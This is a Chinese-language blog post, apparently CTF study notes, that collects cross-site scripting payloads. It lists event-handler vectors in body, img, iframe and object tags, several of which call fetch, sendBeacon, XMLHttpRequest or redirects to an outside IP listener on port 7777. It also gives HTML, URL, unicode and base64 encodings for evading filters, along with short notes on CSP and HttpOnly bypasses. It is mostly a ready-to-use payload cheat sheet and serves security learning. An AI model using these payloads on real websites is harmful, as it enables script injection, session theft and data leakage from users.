---
title: xss
date: 2025-10-28 19:09:12
tags:
---

xss 

<!-- more -->

- DOM 中的事件监听器：如 `location`、`onclick`、`onerror`、`onload`、`onmouseover` 等,一般在 `<img>` `<link>` `<object>` `<body>` `<iframe>`
- HTML DOM 标签属性：`<a>` 标签的 `href` 
- JavaScript 的 `eval()`、`setTimeout()`、`setInterval()` 等



####  标签属性 js 代码执行

`<script>` 

```html
<script>
	code
</script>
```

`body` 标签(事件监听器)

```html
<body onload="window.open('http://47.122.64.159:7777/?a=')">
<body onload="fetch('http://47.122.64.159:7777/?a=')">

<body onload="window.location.href='http://47.122.64.159/'">
<body onload="window.location='http://47.122.64.159/'">
<body onload="location.replace('http://47.122.64.159/')">
  
 <body onload="window.location.assign('http://47.122.64.159:7777/?a=')"></body>
    
```

`img` 标签 (事件监听器)

```html
<img src=1 onxxxx="fetch('http://47.122.64.159:7777/?a=')">
<img src=1 onerror="location='http://47.122.64.159'">
```

`iframe` 标签（`src` 标签，事件监听器）

```html
<iframe src="javascript:alert(1); fetch('http://47.122.64.159:7777')"></iframe>

<iframe src=1 onerror="fetch('http://47.122.64.159:7777')"> </iframe>
```

还有很多标签，例如：` <audio> <video> <svg> <object> <p> <detail>`





部分 `js` 代码

```javascript
javascript:code
javascript:fetch("http://47.122.64.159:7777")

location='http://47.122.64.159'
window.location='http://47.122.64.159/
window.open('http://47.122.64.159:7777/?a=')
location.replace('http://47.122.64.159/')
window.location.assign('http://47.122.64.159:7777/?a=')

var img = new Image();
img.src = 'http://47.122.64.159:7777/';

navigator.sendBeacon('http://47.122.64.159:7777/', 'data=info');

var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://47.122.64.159:7777/');
xhr.send();
```

#### 常见绕过

`href`、`src` 等加载 `URL` 的属性可以使用 `HTML`、`URL`、`JS `编码。

1. `html` 编码

   十进制

   ```html
   <img src=1 onerror="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#102;&#101;&#116;&#99;&#104;&#40;&#34;&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#52;&#55;&#46;&#49;&#50;&#50;&#46;&#54;&#52;&#46;&#49;&#53;&#57;&#58;&#55;&#55;&#55;&#55;&#34;&#41;">
   
   javascript:fetch("http://47.122.64.159:7777")
   ```

   十六进制

   ```html
   &#x6a -> j
   
   <img src=1 onerror="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x66;&#x65;&#x74;&#x63;&#x68;&#x28;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3a;&#x2f;&#x2f;&#x34;&#x37;&#x2e;&#x31;&#x32;&#x32;&#x2e;&#x36;&#x34;&#x2e;&#x31;&#x35;&#x39;&#x3a;&#x37;&#x37;&#x37;&#x37;&#x22;&#x29;">
   
   javascript:fetch("http://47.122.64.159:7777")
   ```

2. `url` 编码

   ```html
   <img src="x" onerror="eval(unescape('%6a%61%76%61%73%63%72%69%70%74%3a%66%65%74%63%68%28%22%68%74%74%70%3a%2f%2f%34%37%2e%31%32%32%2e%36%34%2e%31%35%39%3a%37%37%37%37%22%29'))">
   
   javascript:fetch("http://47.122.64.159:7777")
   ```

   

3. `unicode` 编码

   ```html
   <img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)">
   
   <img src=x onerror="\u0066\u0065\u0074\u0063\u0068('http://47.122.64.159:7777')">
   
   <img src=x onerror="\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074:\u0066\u0065\u0074\u0063\u0068('http://47.122.64.159:7777')">
   
   <!--
   alert(1)
   fetch
   javascript fetch  
   用于关键字编码-->
   ```

4. base64 

   ```html
   <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4="></object>
   
   <object data="data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPSJcdTAwNjZcdTAwNjVcdTAwNzRcdTAwNjNcdTAwNjgoJ2h0dHA6Ly80Ny4xMjIuNjQuMTU5Ojc3NzcnKSI+"></object>
   
   <!-- 
   <script>alert(/xss/)</script>
   
   只是会解析b64数据，不能执行代码，需要类似 <script> 功能的标签或者 提供一个<img src=1 onerror="evil code">
   
   <img src=x onerror="\u0066\u0065\u0074\u0063\u0068('http://47.122.64.159:7777')">
   -->
   ```

   

5. 空格绕过

   ```
   /**/
   /
   ```

6. 单双引号绕过

   ```html
   onerror=fetch(``) <!-- 可以不加引号在 onerror 处。 -->
   ```

   

#### CSP

找什么地方没有引用`csp`，使用跳转，在那个页面进行 xss 。`2025 crewctf`



#### httponly

三明治携带，`2025 n1jctf`





#### csp 属性注入

`2025 RCTF` meta 标签的 content 属性值,没有引号包裹，造成的 csp 注入。

```js
<meta name="author" content=<?php echo $pageAuthor; ?>>
```

```js
'[csp属性]' http-equiv=Content-Security-Policy
```



感觉 link meta iframe 用的好像多一点？



参考文章如下

[ref1]: https://baozongwi.blog/xxx	"1"
[ref2]: https://www.freebuf.com/articles/xss-summary	"2"
[ref3]: https://www.attacker-domain.com/2013/04/deep-dive-into-browser-parsing-and-xss.html	"3"





